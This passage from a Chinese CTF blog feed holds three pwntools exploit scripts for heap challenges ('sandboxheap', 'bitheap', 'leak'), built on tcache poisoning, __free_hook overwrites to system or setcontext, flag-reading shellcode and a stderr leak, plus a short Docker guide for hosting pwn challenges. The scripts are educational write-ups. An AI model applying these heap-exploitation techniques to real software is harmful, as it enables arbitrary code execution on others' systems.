class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">banary = "./sandboxheap"</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">libc = ELF("./libc-2.27.so")</span><br><span class="line">#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">ip = '1.14.71.254'</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = 'debug', os = 'linux', arch = 'amd64')</span><br><span class="line">#context(log_level = 'debug', os = 'linux', arch = 'i386')</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">uheap = lambda : u64(io.recv(6).ljust(8,b'\x00'))</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def cmd(choice):</span><br><span class="line">    ru("Your choice: ")</span><br><span class="line">    sl(str(choice))</span><br><span class="line"></span><br><span class="line">def add(index,size):</span><br><span class="line">    cmd(1)</span><br><span class="line">    sla("Index: ",str(index))</span><br><span class="line">    sla("Size: ",str(size))</span><br><span class="line"></span><br><span class="line">def edit(index,context,one):</span><br><span class="line">    cmd(2)</span><br><span class="line">    sla("Index: ",str(index))</span><br><span class="line">    payload=""</span><br><span class="line">    for i in context:</span><br><span class="line">        t=u8(i)</span><br><span class="line">        for j in range(8):</span><br><span class="line">            if t&amp;1==1:</span><br><span class="line">                payload+=b'1'       </span><br><span class="line">            else:</span><br><span class="line">                payload+=b'0'</span><br><span class="line">            t=t&gt;&gt;1</span><br><span class="line">    if one:</span><br><span class="line">        payload+=b'0'</span><br><span class="line">    sa("Content: ",payload)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    cmd(3)</span><br><span class="line">    sla("Index: ",str(index))</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    cmd(4)</span><br><span class="line">    sla("Index: ",str(index))</span><br><span class="line"></span><br><span class="line">def exit():</span><br><span class="line">    cmd(5)</span><br><span class="line"></span><br><span class="line">for i in range(9):</span><br><span class="line">    add(i,0x100)</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    add(i,0x108)</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">ru("Content: ")</span><br><span class="line">heapbase=u64(io.recv(6).ljust(8,b'\x00'))-0x7b0</span><br><span class="line">print("heapbase:"+hex(heapbase))</span><br><span class="line"></span><br><span class="line">add(7,0x20)</span><br><span class="line">show(7)</span><br><span class="line">ru("Content: ")</span><br><span class="line">libcbase=uu64()-0x3ebda0</span><br><span class="line">print("libcbase:"+hex(libcbase))</span><br><span class="line">system=libcbase+libc.sym['system']</span><br><span class="line">free_hook=libcbase+libc.sym['__free_hook']</span><br><span class="line">setcontext=libcbase+libc.sym['setcontext']+53</span><br><span class="line">mprotect=libcbase+libc.sym['mprotect']</span><br><span class="line"></span><br><span class="line">add(9,0xd0)</span><br><span class="line">add(10,0x100)</span><br><span class="line">add(11,0x68)</span><br><span class="line">add(12,0x100)</span><br><span class="line">add(13,0x50)</span><br><span class="line">add(14,0x68)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(10)</span><br><span class="line">payload=b'A'*0x60+p64(0x1c0-0x40)</span><br><span class="line">edit(11,payload,1)</span><br><span class="line">io.sendline()</span><br><span class="line"></span><br><span class="line">delete(12)</span><br><span class="line">delete(14)</span><br><span class="line">delete(11)</span><br><span class="line"></span><br><span class="line">add(10,0xf0)</span><br><span class="line">add(11,0xf0)</span><br><span class="line">edit(11,p64(0)+p64(0x71)+p64(free_hook),0)</span><br><span class="line">io.sendline()</span><br><span class="line"></span><br><span class="line">add(12,0x68)</span><br><span class="line">add(14,0x68)</span><br><span class="line">payload=p64(setcontext)</span><br><span class="line">edit(14,payload,0)</span><br><span class="line">io.sendline()</span><br><span class="line"></span><br><span class="line">add(0,0x60)</span><br><span class="line">add(2,0x50)</span><br><span class="line">add(1,0xa0)</span><br><span class="line">add(3,0xb0)</span><br><span class="line">payload=p64(0)+p64(heapbase+0x1000)+p64(0x1000)+p64(0)*2+p64(7)+p64(0)+p64(mprotect)+p64(heapbase+0x1000)+p64(mprotect)+p64(heapbase+0x1060)</span><br><span class="line">edit(1,payload,0)</span><br><span class="line">io.sendline()</span><br><span class="line"></span><br><span class="line">shellcode='''</span><br><span class="line">   mov rdi,0;</span><br><span class="line">   mov rdx,0;</span><br><span class="line">'''</span><br><span class="line">shellcode+='int 3'+shellcraft.open('flag')</span><br><span class="line">shellcode+=shellcraft.read(3,'rsp',64)</span><br><span class="line">shellcode+=shellcraft.write(1,'rsp',64)</span><br><span class="line">#shellcode='int 3 '+shellcraft.sh()</span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line">edit(3,shellcode,1)</span><br><span class="line">io.sendline()</span><br><span class="line">cmd(4)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">sla("Index: ",str(2))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></tbody></table></figure><p>本地不知道啥原因打orw不出flag，非得动调进去一步一步走完shellcode才可以出flag，猜测远程应该没这个问题</p><h3 id="bitheap"><a href="#bitheap" class="headerlink" title="bitheap"></a>bitheap</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">banary = "./bitheap"</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">libc = ELF("./libc-2.27.so")</span><br><span class="line">#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">ip = '1.14.71.254'</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = 'debug', os = 'linux', arch = 'amd64')</span><br><span class="line">#context(log_level = 'debug', os = 'linux', arch = 'i386')</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">uheap = lambda : u64(io.recv(6).ljust(8,b'\x00'))</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def cmd(choice):</span><br><span class="line">    ru("Your choice: ")</span><br><span class="line">    sl(str(choice))</span><br><span class="line"></span><br><span class="line">def add(index,size):</span><br><span class="line">    cmd(1)</span><br><span class="line">    sla("Index: ",str(index))</span><br><span class="line">    sla("Size: ",str(size))</span><br><span class="line"></span><br><span class="line">def edit(index,context,one):</span><br><span class="line">    cmd(2)</span><br><span class="line">    sla("Index: ",str(index))</span><br><span class="line">    payload=""</span><br><span class="line">    for i in context:</span><br><span class="line">        t=u8(i)</span><br><span class="line">        for j in range(8):</span><br><span class="line">            if t&amp;1==1:</span><br><span class="line">                payload+=b'1'       </span><br><span class="line">            else:</span><br><span class="line">                payload+=b'0'</span><br><span class="line">            t=t&gt;&gt;1</span><br><span class="line">    if one:</span><br><span class="line">        payload+=b'0'</span><br><span class="line">    sa("Content: ",payload)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    cmd(3)</span><br><span class="line">    sla("Index: ",str(index))</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    cmd(4)</span><br><span class="line">    sla("Index: ",str(index))</span><br><span class="line"></span><br><span class="line">def exit():</span><br><span class="line">    cmd(5)</span><br><span class="line"></span><br><span class="line">for i in range(9):</span><br><span class="line">    add(i,0x100)</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    add(i,0x108)</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">ru("Content: ")</span><br><span class="line">heapbase=u64(io.recv(6).ljust(8,b'\x00'))-0x7b0</span><br><span class="line">print("heapbase:"+hex(heapbase))</span><br><span class="line"></span><br><span class="line">add(7,0x20)</span><br><span class="line">show(7)</span><br><span class="line">ru("Content: ")</span><br><span class="line">libcbase=uu64()-0x3ebda0</span><br><span class="line">print("libcbase:"+hex(libcbase))</span><br><span class="line">system=libcbase+libc.sym['system']</span><br><span class="line">free_hook=libcbase+libc.sym['__free_hook']</span><br><span class="line">setcontext=libcbase+libc.sym['setcontext']+53</span><br><span class="line">mprotect=libcbase+libc.sym['mprotect']</span><br><span class="line"></span><br><span class="line">add(9,0xd0)</span><br><span class="line">add(10,0x100)</span><br><span class="line">add(11,0x68)</span><br><span class="line">add(12,0x100)</span><br><span class="line">add(13,0x50)</span><br><span class="line">add(14,0x68)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(10)</span><br><span class="line">payload=b'A'*0x60+p64(0x1c0-0x40)</span><br><span class="line">edit(11,payload,1)</span><br><span class="line">io.sendline()</span><br><span class="line"></span><br><span class="line">delete(12)</span><br><span class="line">delete(14)</span><br><span class="line">delete(11)</span><br><span class="line"></span><br><span class="line">add(10,0xf0)</span><br><span class="line">add(11,0xf0)</span><br><span class="line">edit(11,p64(0)+p64(0x71)+p64(free_hook),0)</span><br><span class="line">io.sendline()</span><br><span class="line"></span><br><span class="line">add(12,0x68)</span><br><span class="line">add(14,0x68)</span><br><span class="line">payload=p64(system)</span><br><span class="line">edit(14,payload,0)</span><br><span class="line">io.sendline()</span><br><span class="line"></span><br><span class="line">add(15,0x110)</span><br><span class="line">edit(15,b'/bin/sh\x00',0)</span><br><span class="line">delete(15)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></tbody></table></figure><p>就是一个简单的打free_hook，用sandbox一样的脚本也可以打通</p><h1 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h1><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">banary = "./leak"</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">libc = ELF("./libc-2.27.so")</span><br><span class="line">#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">ip = '1.14.71.254'</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = 'debug', os = 'linux', arch = 'amd64')</span><br><span class="line">#context(log_level = 'debug', os = 'linux', arch = 'i386')</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">uheap = lambda : u64(io.recv(6).ljust(8,b'\x00'))</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">sleep(1)</span><br><span class="line">def cmd(choice):</span><br><span class="line">    ru("Your choice:")</span><br><span class="line">    sl(str(choice))</span><br><span class="line"></span><br><span class="line">def add(index,size):</span><br><span class="line">    cmd(1)</span><br><span class="line">    ru("Index:")</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru("Size:")</span><br><span class="line">    sl(str(size))</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    cmd(2)</span><br><span class="line">    ru("Index:")</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru("Content:")</span><br><span class="line">    s(content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    cmd(3)</span><br><span class="line">    ru("Index:")</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line">def cipher(index1,index2):</span><br><span class="line">    cmd(4)</span><br><span class="line">    sla("Text index: ",str(index1))</span><br><span class="line">    sla("Passwd index: ",str(index2))</span><br><span class="line"></span><br><span class="line">def decipher(index1,index2):</span><br><span class="line">    cmd(5)</span><br><span class="line">    sla("Text index: ",str(index1))</span><br><span class="line">    sla("Passwd index: ",str(index2))</span><br><span class="line"></span><br><span class="line">def exit():</span><br><span class="line">    cmd(6)</span><br><span class="line"></span><br><span class="line">add(0,0x14b0)#fastbin</span><br><span class="line">add(1,0x200)</span><br><span class="line">add(2,0x110)</span><br><span class="line">add(4,0x30)</span><br><span class="line">add(3,0x120)</span><br><span class="line">add(5,0x50)</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">edit(1,p64(0)*2)</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">edit(1,b'\x50')</span><br><span class="line">add(6,0x200)</span><br><span class="line">add(7,0x200)</span><br><span class="line">delete(2)</span><br><span class="line">delete(3)</span><br><span class="line"></span><br><span class="line">edit(7,p64(0)+p64(0x4a1))</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">add(8,0x200)</span><br><span class="line">add(9,0x150)</span><br><span class="line">edit(2,b'\x80\xe6')#_IO_2_1_stderr</span><br><span class="line">edit(3,b'\x40\xf9')#global_max_fast</span><br><span class="line">add(10,0x110)</span><br><span class="line">add(11,0x110)</span><br><span class="line">add(12,0x120)</span><br><span class="line">add(13,0x120)</span><br><span class="line">edit(13,p64(0x60000))</span><br><span class="line">edit(11,p64(0xfbad1800)+p64(0)*4+p64(0x555555617960)+p64(0)*8+p64(2))</span><br><span class="line">#dbg()</span><br><span class="line">delete(0)</span><br><span class="line">dbg()</span><br><span class="line">edit(11,p64(0xfbad1800)+p64(0)*3+b'\x60')</span><br><span class="line">#dbg()</span><br><span class="line">cmd(6)</span><br><span class="line">ia()</span><br></pre></td></tr></tbody></table></figure><p>打stderr泄露</p><h3 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h3><p>暂时还没复现</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;unexploitable&quot;&gt;&lt;a href=&quot;#unexploitable&quot; class=&quot;headerlink&quot; title=&quot;unexploitable&quot;&gt;&lt;/a&gt;unexploitable&lt;/h3&gt;&lt;p&gt;爆破onegadget&lt;/p&gt;
&lt;p&gt;exp:&lt;/p</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>docker</title>
    <link href="http://wscyoulin.github.io/2022/10/16/docker/"/>
    <id>http://wscyoulin.github.io/2022/10/16/docker/</id>
    <published>2022-10-15T16:02:57.000Z</published>
    <updated>2022-10-15T16:20:29.530Z</updated>
    
    <content type="html"><![CDATA[<p>docker理解起来就相当于一个小型的虚拟机， 主要是想学着用来跑一些pwn题</p><p>安装docker:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh</span><br></pre></td></tr></tbody></table></figure><p>启用：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></tbody></table></figure><p>下面以hello-world和Ubuntu镜像文件为例，演示一些docker的基本操作</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker image pull library/hello-world #抓取镜像文件</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/hello-world</span><br><span class="line">Digest: sha256:18a657d0cc1c7d0678a3fbea8b7eb4918bba25968d3e1b0adebfa71caddbc346</span><br><span class="line">Status: Image is up to date for hello-world:latest</span><br><span class="line">docker.io/library/hello-world:latest</span><br><span class="line">$ sudo docker image ls #查看本地的镜像文件</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">youlin666     latest    58500f9d97e4   10 hours ago    359MB</span><br><span class="line">youlin        latest    58500f9d97e4   10 hours ago    359MB</span><br><span class="line">ubuntu        22.04     216c552ea5ba   10 days ago     77.8MB</span><br><span class="line">hello-world   latest    feb5d9fea6a5   12 months ago   13.3kB</span><br><span class="line">$ sudo docker run hello-world #生成容器并运行，该容器输出错误信息后自动终止</span><br><span class="line"></span><br><span class="line">Hello from Docker!</span><br><span class="line">This message shows that your installation appears to be working correctly.</span><br><span class="line"></span><br><span class="line">To generate this message, Docker took the following steps:</span><br><span class="line"> 1. The Docker client contacted the Docker daemon.</span><br><span class="line"> 2. The Docker daemon pulled the "hello-world" image from the Docker Hub.</span><br><span class="line">    (amd64)</span><br><span class="line"> 3. The Docker daemon created a new container from that image which runs the</span><br><span class="line">    executable that produces the output you are currently reading.</span><br><span class="line"> 4. The Docker daemon streamed that output to the Docker client, which sent it</span><br><span class="line">    to your terminal.</span><br><span class="line"></span><br><span class="line">To try something more ambitious, you can run an Ubuntu container with:</span><br><span class="line"> $ docker run -it ubuntu bash</span><br><span class="line"></span><br><span class="line">Share images, automate workflows, and more with a free Docker ID:</span><br><span class="line"> https://hub.docker.com/</span><br><span class="line"></span><br><span class="line">For more examples and ideas, visit:</span><br><span class="line"> https://docs.docker.com/get-started/</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker run -it ubuntu /bin/bash #启动一个不会自动终止的Ubuntu容器 ctrl+P+Q可推出控制台，容器保持后台运行</span><br><span class="line">$ sudo docker ps #列出正在运行的容器</span><br><span class="line">$ sudo docker stop xxxx #停止正在运行的容器</span><br></pre></td></tr></tbody></table></figure><h1 id="pwn题部署"><a href="#pwn题部署" class="headerlink" title="pwn题部署"></a>pwn题部署</h1><p>板子推荐：<a href="https://pan.baidu.com/s/17kjRaw3FietYA3UxvJeiCw?pwd=0a5e">https://pan.baidu.com/s/17kjRaw3FietYA3UxvJeiCw?pwd=0a5e</a> </p><p>首先将pwn题复制到bin目录下，并且改名为pwn</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker build -t "test" ./</span><br><span class="line">$ sudo docker run -d -p "0.0.0.0:10005:9999" -h "test" --name "test" test</span><br></pre></td></tr></tbody></table></figure><p>题目就可以在docker里面跑起来了，占用的是10005的端口</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;docker理解起来就相当于一个小型的虚拟机， 主要是想学着用来跑一些pwn题&lt;/p&gt;
&lt;p&gt;安装docker:&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>buu_web（1-20）</title>
    <link href="http://wscyoulin.github.io/2022/10/14/buu-web%EF%BC%881-20%EF%BC%89/"/>
    <id>http://wscyoulin.github.io/2022/10/14/buu-web%EF%BC%881-20%EF%BC%89/</id>
    <published>2022-10-13T16:15:17.000Z</published>
    <updated>2022-11-18T16:39:28.193Z</updated>
    
